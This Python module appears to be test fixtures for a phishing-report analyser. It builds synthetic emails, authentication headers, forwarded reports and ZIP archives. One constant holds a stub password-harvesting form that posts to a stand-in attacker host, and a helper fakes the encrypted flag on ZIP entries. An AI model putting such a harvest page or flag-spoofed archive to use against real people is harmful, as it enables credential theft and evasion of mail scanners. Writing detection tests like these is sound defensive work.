"""Builders for synthetic RFC 5322 messages (reserved domains and documentation addresses only)."""

from __future__ import annotations

import io
import zipfile
from email.message import EmailMessage
from typing import Dict, Optional, Sequence, Tuple

MX = "mx.example.com"
PDF = b"%PDF-1.7\n1 0 obj << >> endobj\n%%EOF\n"
PE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56
LNK = bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 16
HARVEST = b"<html><body><form action='https://collect.attacker.test/post'><input type='password'></form></body></html>"


def auth(domain: str, spf: str = "pass", dkim: str = "pass", dmarc: str = "pass", authserv: str = MX) -> str:
    return (
        f"{authserv}; spf={spf} smtp.mailfrom={domain}; dkim={dkim} header.d={domain}; "
        f"dmarc={dmarc} header.from={domain}"
    )


def build(
    *,
    sender: str = "sender@partner.test",
    display: str = "",
    subject: str = "Hello",
    text: str = "Hello there.",
    html: Optional[str] = None,
    to: str = "alice@example.com",
    reply_to: Optional[str] = None,
    return_path: Optional[str] = None,
    ar: Sequence[str] = (),
    received: Sequence[str] = (),
    attachments: Sequence[Tuple[str, str, str, bytes]] = (),
    message_id: Optional[str] = "<m1@partner.test>",
) -> EmailMessage:
    msg = EmailMessage()
    for value in ar:
        msg["Authentication-Results"] = value
    for value in received:
        msg["Received"] = value
    if return_path:
        msg["Return-Path"] = f"<{return_path}>"
    msg["From"] = f'"{display}" <{sender}>' if display else sender
    msg["To"] = to
    if reply_to:
        msg["Reply-To"] = reply_to
    msg["Subject"] = subject
    msg["Date"] = "Mon, 28 Sep 2026 09:30:00 +0000"
    if message_id:
        msg["Message-ID"] = message_id
    msg.set_content(text)
    if html is not None:
        msg.add_alternative(html, subtype="html")
    for filename, maintype, subtype, data in attachments:
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=filename)
    return msg


def wrap(inner: EmailMessage, reporter: str = "bob@example.com") -> bytes:
    """A user's report: the suspicious message forwarded as a message/rfc822 attachment."""
    outer = EmailMessage()
    outer["From"] = f"Bob <{reporter}>"
    outer["To"] = "phish@example.com"
    outer["Subject"] = "FW: suspicious"
    outer["Message-ID"] = "<report-1@example.com>"
    outer.set_content("Reporting this one.")
    outer.add_attachment(inner)
    return outer.as_bytes()


def zip_bytes(files: Dict[str, bytes], *, encrypted: bool = False) -> bytes:
    """A ZIP archive; ``encrypted`` sets the "encrypted" flag on every entry (zipfile cannot write encrypted entries)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        for name, data in files.items():
            archive.writestr(zipfile.ZipInfo(name, date_time=(2026, 9, 28, 9, 30, 0)), data)
    data = bytearray(buf.getvalue())
    if encrypted:
        for signature, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            start = data.find(signature)
            while start >= 0:
                data[start + offset] |= 0x1
                start = data.find(signature, start + 4)
    return bytes(data)
